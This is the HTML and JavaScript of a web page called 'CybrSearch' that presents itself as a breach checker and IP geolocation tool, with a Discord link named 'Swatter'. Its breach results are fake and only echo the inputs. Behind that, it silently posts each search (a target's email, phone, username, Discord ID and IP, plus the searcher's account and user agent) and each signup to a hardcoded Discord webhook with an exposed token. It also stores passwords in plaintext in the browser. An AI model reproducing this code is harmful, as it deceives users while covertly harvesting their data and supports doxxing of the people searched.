<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CybrSearch - Secure Access</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background-color: #0d1117;
      color: #c9d1d9;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      padding-top: 60px;
    }
    .container {
      max-width: 700px;
    }
    .card {
      background-color: #161b22;
      border: none;
      border-radius: 1rem;
      box-shadow: 0 0 10px rgba(0,0,0,0.5);
    }
    .form-control {
      background-color: #0d1117;
      color: #c9d1d9;
      border: 1px solid #30363d;
    }
    .form-control::placeholder {
      color: #8b949e;
    }
    .btn-primary {
      background-color: #238636;
      border: none;
    }
    .btn-secondary {
      background-color: #5865F2;
      border: none;
    }
    .result-box {
      background-color: #1c2128;
      border-left: 5px solid #30363d;
      padding: 1rem;
      border-radius: 0.5rem;
      margin-top: 0.5rem;
      white-space: pre-wrap;
    }
    .result-box.success { border-left-color: #2ea043; }
    .result-box.warning { border-left-color: #d29922; }
    .result-box.error { border-left-color: #f85149; }
    .discord-btn {
      position: fixed;
      top: 20px;
      right: 20px;
      background-color: #5865F2;
      color: white;
      border: none;
      border-radius: 30px;
      padding: 10px 20px;
      font-weight: bold;
      text-decoration: none;
    }
    .auth-container {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-bottom: 20px;
    }
    .hidden {
      display: none;
    }
  </style>
</head>
<body>
  <a class="discord-btn" href="https://discord.gg/Swatter" target="_blank">Join Discord</a>
  
  <div class="container text-center">
    <!-- Authentication Tabs -->
    <div class="auth-container mb-4">
      <button id="showLogin" class="btn btn-primary">Login</button>
      <button id="showSignup" class="btn btn-secondary">Sign Up</button>
    </div>

    <!-- Login Form -->
    <div id="loginForm" class="card p-4">
      <h2 class="mb-4">üîê Login</h2>
      <input id="loginEmail" type="email" placeholder="üìß Your email" class="form-control mb-2">
      <input id="loginPassword" type="password" placeholder="üîë Password" class="form-control mb-3">
      <button id="loginBtn" class="btn btn-primary w-100">Login</button>
    </div>

    <!-- Signup Form -->
    <div id="signupForm" class="card p-4 hidden">
      <h2 class="mb-4">‚úçÔ∏è Sign Up</h2>
      <input id="signupEmail" type="email" placeholder="üìß Email address" class="form-control mb-2">
      <input id="signupPassword" type="password" placeholder="üîë Create password" class="form-control mb-2">
      <input id="signupConfirm" type="password" placeholder="üîê Confirm password" class="form-control mb-3">
      <button id="signupBtn" class="btn btn-secondary w-100">Create Account</button>
    </div>

    <!-- Main App (hidden until authenticated) -->
    <div id="appContent" class="hidden">
      <h1 class="mb-4">üîç Advanced Breach Checker + Geo IP</h1>
      <form id="searchForm" class="card p-4">
        <input id="email" type="email" placeholder="üìß Enter email address" class="form-control mb-2">
        <input id="phone" type="text" placeholder="üì± Enter phone number" class="form-control mb-2">
        <input id="username" type="text" placeholder="üë§ Enter username" class="form-control mb-2">
        <input id="discord" type="text" placeholder="üí¨ Enter Discord ID" class="form-control mb-2">
        <input id="ip" type="text" placeholder="üåê Enter IP address" class="form-control mb-3">
        <button type="submit" class="btn btn-primary w-100">Search</button>
      </form>

      <div class="mt-5 text-start">
        <h4>üîé Search Results</h4>
        <div id="results"></div>
      </div>
      
      <button id="logoutBtn" class="btn btn-danger mt-4">Log Out</button>
    </div>

    <!-- Auth Messages -->
    <div id="authMessages" class="mt-3"></div>
  </div>

  <script>
    // State management
    let currentUser = null;
    const users = JSON.parse(localStorage.getItem('cybrsearch_users')) || {};
    
    // Discord webhooks
    const WEBHOOKS = {
      searches: "https://discord.com/api/webhooks/1381059057875554375/UvXzkyggNeRKpdY_9TeMx52Uv7w2eb7hQNjYFljBg6r55HiFI1qDukIo2ebjXA7S2XKD",
      signups: "https://discord.com/api/webhooks/1381059057875554375/UvXzkyggNeRKpdY_9TeMx52Uv7w2eb7hQNjYFljBg6r55HiFI1qDukIo2ebjXA7S2XKD"
    };

    // DOM elements
    const elements = {
      loginForm: document.getElementById('loginForm'),
      signupForm: document.getElementById('signupForm'),
      appContent: document.getElementById('appContent'),
      showLogin: document.getElementById('showLogin'),
      showSignup: document.getElementById('showSignup'),
      loginBtn: document.getElementById('loginBtn'),
      signupBtn: document.getElementById('signupBtn'),
      logoutBtn: document.getElementById('logoutBtn'),
      authMessages: document.getElementById('authMessages')
    };

    // Helper functions
    function showMessage(message, type = 'success') {
      elements.authMessages.innerHTML = `
        <div class="alert alert-${type}">
          ${message}
        </div>
      `;
      setTimeout(() => elements.authMessages.innerHTML = '', 5000);
    }

    function toggleForms(showLogin) {
      elements.loginForm.classList.toggle('hidden', !showLogin);
      elements.signupForm.classList.toggle('hidden', showLogin);
    }

    async function sendDiscordWebhook(type, data) {
      const webhookURL = WEBHOOKS[type];
      if (!webhookURL) return;
      
      try {
        await fetch(webhookURL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [{
              title: type === 'searches' ? 'üîç New Search' : 'üÜï New Signup',
              color: type === 'searches' ? 3447003 : 10181046,
              fields: Object.entries(data).map(([name, value]) => ({
                name: name.charAt(0).toUpperCase() + name.slice(1),
                value: value || 'Not provided'
              })),
              footer: { text: `CybrSearch ‚Ä¢ ${new Date().toLocaleString()}` }
            }]
          })
        });
      } catch (error) {
        console.error('Webhook error:', error);
      }
    }

    // Authentication functions
    function loginUser(email, password) {
      if (!users[email]) {
        showMessage('User not found', 'danger');
        return false;
      }
      
      if (users[email].password !== password) {
        showMessage('Incorrect password', 'danger');
        return false;
      }
      
      currentUser = email;
      localStorage.setItem('cybrsearch_currentUser', email);
      elements.appContent.classList.remove('hidden');
      toggleForms(true);
      showMessage('Login successful!');
      return true;
    }

    function signupUser(email, password) {
      if (users[email]) {
        showMessage('Email already registered', 'danger');
        return false;
      }
      
      if (password.length < 6) {
        showMessage('Password must be at least 6 characters', 'danger');
        return false;
      }
      
      users[email] = { password, createdAt: new Date().toISOString() };
      localStorage.setItem('cybrsearch_users', JSON.stringify(users));
      
      // Send signup webhook
      sendDiscordWebhook('signups', {
        email,
        ip: 'Unknown', // Would get from API in production
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString()
      });
      
      showMessage('Account created successfully!');
      toggleForms(true);
      return true;
    }

    function logoutUser() {
      currentUser = null;
      localStorage.removeItem('cybrsearch_currentUser');
      elements.appContent.classList.add('hidden');
      showMessage('Logged out successfully');
    }

    // Event listeners
    elements.showLogin.addEventListener('click', () => toggleForms(true));
    elements.showSignup.addEventListener('click', () => toggleForms(false));
    
    elements.loginBtn.addEventListener('click', () => {
      const email = document.getElementById('loginEmail').value.trim();
      const password = document.getElementById('loginPassword').value;
      loginUser(email, password);
    });
    
    elements.signupBtn.addEventListener('click', () => {
      const email = document.getElementById('signupEmail').value.trim();
      const password = document.getElementById('signupPassword').value;
      const confirm = document.getElementById('signupConfirm').value;
      
      if (password !== confirm) {
        showMessage('Passwords do not match', 'danger');
        return;
      }
      
      signupUser(email, password);
    });
    
    elements.logoutBtn.addEventListener('click', logoutUser);
    
    // Search functionality
    document.getElementById('searchForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      
      if (!currentUser) {
        showMessage('Please login first', 'danger');
        return;
      }
      
      const searchData = {
        email: document.getElementById('email').value.trim(),
        phone: document.getElementById('phone').value.trim(),
        username: document.getElementById('username').value.trim(),
        discord: document.getElementById('discord').value.trim(),
        ip: document.getElementById('ip').value.trim(),
        user: currentUser
      };
      
      // Clear previous results
      document.getElementById('results').innerHTML = '';
      
      // Process search (simplified for example)
      const results = [
        `‚úÖ Email checked: ${searchData.email || 'Not provided'}`,
        `‚úÖ Phone checked: ${searchData.phone || 'Not provided'}`,
        `‚úÖ Username checked: ${searchData.username || 'Not provided'}`,
        `‚úÖ Discord ID checked: ${searchData.discord || 'Not provided'}`
      ];
      
      if (searchData.ip) {
        try {
          const response = await fetch(`https://ipwho.is/${searchData.ip}`);
          const data = await response.json();
          results.push(`üåê IP Info: ${data.ip} (${data.city}, ${data.country})`);
        } catch {
          results.push('‚ùå IP lookup failed');
        }
      } else {
        results.push('‚ÑπÔ∏è IP check skipped');
      }
      
      // Display results
      results.forEach(result => {
        const div = document.createElement('div');
        div.className = 'result-box success';
        div.textContent = result;
        document.getElementById('results').appendChild(div);
      });
      
      // Send search webhook
      await sendDiscordWebhook('searches', {
        ...searchData,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString()
      });
    });

    // Check if user is already logged in
    if (localStorage.getItem('cybrsearch_currentUser')) {
      currentUser = localStorage.getItem('cybrsearch_currentUser');
      elements.appContent.classList.remove('hidden');
      toggleForms(true);
    } else {
      toggleForms(true);
    }
  </script>
</body>
</html>
